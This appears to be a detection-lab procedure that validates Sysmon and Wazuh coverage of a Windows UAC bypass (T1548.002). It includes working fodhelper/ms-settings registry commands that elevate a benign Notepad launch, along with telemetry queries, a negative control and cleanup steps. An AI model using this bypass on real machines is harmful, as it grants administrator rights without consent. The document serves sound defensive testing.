# T1548.002 Bypass User Account Control Detection Lab

## Purpose

Validate that Sysmon and Wazuh preserve and detect the registry and process lineage associated with a controlled Windows UAC bypass. The final payload starts Notepad through `cmd.exe` so the test is visible and bounded. It does not create an account, install software, establish persistence, access credentials, or contact a network service.

## Safety boundary

- Run only on the isolated `WIN11` lab VM.
- Take a VM snapshot first.
- Use a dedicated lab identity confirmed as a local administrator running with a filtered Medium-integrity token. The first attempt with `CORP\alice.c.johnson` produced a credential prompt and must not be treated as a valid positive test.
- Do not substitute a shell, remote connection, executable download, security-control change, or persistent payload.
- Remove the registry key in a `finally` block and verify cleanup.

## Controlled positive simulation

Run this block from the already validated **non-elevated** `cmd.exe` window as `WIN11\win11`.

```cmd
reg delete HKCU\Software\Classes\ms-settings /f
reg query HKCU\Software\Classes\ms-settings\Shell\Open\command

reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /d "cmd.exe /c start notepad.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f
start "" "%WINDIR%\System32\fodhelper.exe"
timeout /t 5
reg delete HKCU\Software\Classes\ms-settings /f
reg query HKCU\Software\Classes\ms-settings\Shell\Open\command
```

Expected output:

- Notepad opens;
- `cmd.exe` remains open;
- the final `reg query` reports that the key cannot be found;
- no UAC consent prompt appears.

Capture the complete output as `screenshots/006-positive-cmd-rerun-cleanup.png`.

## Endpoint telemetry validation

Open an elevated PowerShell window only after the controlled simulation has completed. Query the last 15 minutes:

```powershell
$Since = (Get-Date).AddMinutes(-15)

Get-WinEvent -FilterHashtable @{
    LogName   = 'Microsoft-Windows-Sysmon/Operational'
    Id        = 1, 13
    StartTime = $Since
} -MaxEvents 200 |
Where-Object Message -Match 'ms-settings|fodhelper|DelegateExecute|cmd.exe|notepad.exe' |
Sort-Object TimeCreated |
Format-List TimeCreated, Id, Message

Get-WinEvent -FilterHashtable @{
    LogName   = 'Security'
    Id        = 4688
    StartTime = $Since
} -MaxEvents 200 |
Where-Object Message -Match 'fodhelper.exe|cmd.exe|TokenElevationTypeFull|S-1-16-12288' |
Sort-Object TimeCreated |
Format-List TimeCreated, Id, Message
```

Confirm the following chain:

```text
Medium cmd.exe
  -> registry values beneath HKCU\Software\Classes\ms-settings\Shell\Open\command
  -> fodhelper.exe
  -> full-token cmd.exe
  -> benign notepad.exe launch
```

Sysmon Event `13` records the registry precondition, Sysmon Event `1` records `fodhelper.exe`, and Windows Security Event `4688` records the full-token `cmd.exe` child.

## Negative control

Verify the registry key is absent, then launch the broker without a handler override:

```powershell
$LabKey = 'HKCU:\Software\Classes\ms-settings\Shell\Open\command'
if (Test-Path $LabKey) {
    throw 'Do not run the control until the test key is removed.'
}

$ControlStart = Get-Date
Start-Process "$env:WINDIR\System32\fodhelper.exe"
"Control start: $($ControlStart.ToString('o'))"
```

Rule `100227` may record the broker as context. Rules `100226` and `100228` must not fire for this control.

```text
agent.name:"WIN11" AND rule.id:("100226" OR "100228") AND @timestamp >= "CONTROL_START_UTC"
```

Capture the zero-result query as `screenshots/009-negative-control-no-high-signal-alert.png`.

## Final cleanup

```powershell
$LabKey = 'HKCU:\Software\Classes\ms-settings\Shell\Open\command'

Remove-Item 'HKCU:\Software\Classes\ms-settings' `
    -Recurse -Force -ErrorAction SilentlyContinue

"Registry key remains: $(Test-Path $LabKey)"
```

The check must return `False`.
